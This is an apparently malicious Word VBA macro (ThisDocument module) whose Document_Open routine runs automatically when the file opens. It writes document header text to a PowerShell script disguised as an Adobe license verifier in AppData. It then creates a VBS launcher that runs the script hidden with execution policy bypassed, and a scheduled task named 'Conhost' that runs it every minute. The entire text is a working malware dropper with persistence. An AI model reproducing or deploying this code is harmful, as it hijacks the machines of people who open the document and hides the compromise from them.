Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True

Sub Document_Open()
On Error Resume Next
Dim PSF, Tmp As String

Dim singleLine As Paragraph
Dim lineText As String
Dim yCYnlofR
Dim f
Dim qgcLyiCkx As String
qgcLyiCkx = Environ$("AppData") & "\AdobeAcrobatLicenseVerify.ps1"
Set yCYnlofR = CreateObject("Scripting.FileSystemObject")
Set f = yCYnlofR.OpenTextFile(qgcLyiCkx, 2, True)
Dim rng As Range
Dim intSecCount As Integer
Dim intHFType As Integer
intSecCount = ActiveDocument.Sections.Count
For intSection = 1 To intSecCount
    With ActiveDocument.Sections(intSection)
        For intHFType = 1 To 2
            Set rng = ActiveDocument.Sections(intSection).Headers(intHFType).Range
            f.write (rng)
        Next intHFType
    End With
Next intSection
f.Close

PSF = Environ$("AppData") & "\AdobeAcrobatLicenseVerify.ps1"
Tmp = Environ$("AppData") & "\AdobeAcrobatLicenseVerify.vbs"
Dim cmd As String
cmd = "Set oShell = WScript.CreateObject (%WScript.Shell%) : oShell.run %cmd.exe /c Powershell -exec bypass -Windowstyle hidden -File ! %,0,0"
cmd = Replace(cmd, "%", Chr(34))
cmd = Replace(cmd, "!", PSF)

Shell Environ$("COMSPEC") & " /c echo " & Chr(32) & cmd & Chr(32) & " > " & Chr(34) & Tmp & Chr(34), vbHide
Shell Environ$("COMSPEC") & " /c " & "SchTasks /Create /SC MINUTE /MO 1 /TN " & Chr(34) & "Conhost" & Chr(34) & " /TR " & Chr(34) & "wscript " & Tmp & Chr(34), vbHide
End Sub
